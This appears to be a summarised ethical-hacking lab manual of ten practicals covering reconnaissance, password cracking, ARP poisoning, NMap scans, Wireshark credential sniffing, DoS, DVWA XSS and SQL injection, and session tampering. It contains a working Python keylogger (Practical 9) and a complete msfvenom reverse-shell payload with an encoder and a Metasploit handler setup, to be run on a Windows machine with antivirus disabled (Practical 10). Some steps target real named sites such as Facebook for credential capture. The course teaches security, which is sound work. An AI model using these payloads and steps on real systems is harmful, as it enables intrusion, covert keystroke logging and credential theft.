Practical 1: Reconnaissance

Aim: Use Google and Whois for Reconnaissance.

    The document shows the use of DomainTools for Whois lookups to find domain records (e.g., for Facebook.com), including IP addresses, locations, ASN, and registration history.

Practical 2: Encryption and Password Cracking

Aim (a): Use CrypTool to encrypt and decrypt passwords using RC4 algorithm.

    Install CrypTool from the official website.

    Enter Plain Text (e.g., "Hello World").

    To Encrypt: Click on Encrypt/Decrypt > Symmetric(modern) > RC4.

    Select the number of bits (e.g., 24 bits).

    Click Encrypt.

    To Decrypt: Again click on Encrypt/Decrypt > Symmetric(modern) > RC4.

    Select the same number of bits.

    Click Decrypt to return to the original text.

Aim (b): Use Cain and Abel for cracking Windows account passwords and decoding wireless passwords.

    Open the software and click on the Cracker tab, then select the Hash Calculator tool.

    Add the text, click Calculate, and copy the MD5 hash value.

    Click on MD5 Hashes > Add list > Paste Hash Value.

    Right-click the hash code and select Dictionary Attack > Add to list > Start.

Practical 3: Linux Commands and ARP Poisoning

Aim (a): Run and analyze Linux network commands.

    Run ifconfig, ping, netstat, and traceroute.

Aim (b): Perform ARP Poisoning in Windows.

    Click on the Sniffer tab.

    Right-click on any IP and select Resolve Host Name.

    Click on the ARP tab at the bottom.

    Click on the IP and then click the start button (as shown in image) to begin ARP Poisoning.

Practical 4: Port Scanning with NMap

Aim: Use NMap to perform port scanning (ACK, SYN, FIN, NULL, XMAS).

    Installation: Install NMap for Windows and verify by typing nmap in CMD.

    ACK Scan: nmap -sA -T4 scanme.nmap.org (used to map firewall rulesets).

    SYN (Stealth) Scan: nmap -p22,113,139 scanme.nmap.org (the default stealth option).

    FIN Scan: nmap -sF -T4 para.

    NULL Scan: nmap –sN –p 22 scanme.nmap.org.

    XMAS Scan: nmap -sX -T4 scanme.nmap.org.

Practical 5: Traffic Analysis and DoS

Aim (a): Capture and analyze traffic using Wireshark.

    Open Wireshark and select your connection.

    Open an HTTP website and set the display filter to http.

    Right-click on the POST method > Follow > TCP stream.

    Search for "credentials" in the dialog box.

Aim (b): Use Nemesy to launch a DoS attack.
Practical 6: Persistent XSS Attack

Aim: Simulate a persistent cross-site scripting attack.

    Extract DVWA and paste it into C:\xampp\htdocs.

    Rename the folder to DVWA and the config file to config.inc.php.

    Access localhost/DVWA in Chrome and click Create/Reset database.

    Login with Username: Admin and Password: password.

    Go to DVWA Security and set it to Low.

    Click XSS (Stored), write the script, and click Sign Guestbook.

    The script will execute whenever the page is reloaded.

Practical 7: Session Impersonation

Aim: Session impersonation using Firefox and Tamper Data.

    Open Firefox and install the Tamper Data extension via Tools > Add-ons.

    Open the target login page (e.g., Facebook).

    Start tampering data via the add-on.

    Enter credentials to capture them.

    Alternatively, select a commerce site (e.g., razorba), add an item to the cart, refresh the page, and change values in the Cookie option within Tamper Data.

Practical 8: SQL Injection

Aim: Perform an SQL injection attack.

    Follow the setup steps for DVWA as in Practical 6 (Steps 1–8).

    Click on SQL Injection.

    Enter 1 in the User ID field and click submit.

    Type 1' or tue;# (likely a typo for 1' or 1=1;#) and click submit to view results.

Practical 9: Python Keylogger

Aim: Create a simple keylogger using Python.

    Install pynput library.

    Use the following code:
    Python

    from pynput.keyboard import Key, Listener 
    import logging 
    log_dir = "" 
    logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s:') 
    def on_press(key): 
        logging.info(str(key)) 
    with Listener(on_press=on_press) as listener: 
        listener.join()

Practical 10: Metasploit Exploitation

Aim: Use Metasploit on Kali Linux to exploit a system.

    Boot Kali Linux from a pendrive.

    Open Metasploit (msfconsole).

    Generate the payload: msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.9.191 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe.

    In msfconsole, type: use exploit/multi/handler.

    Set payload: set payload windows/shell/reverse_tcp.

    Set options: set LHOST 192.168.9.191 and set LPORT 31337.

    Type exploit.

    Execution: Transfer the generated .exe file to a Windows PC (with antivirus off) and run it.
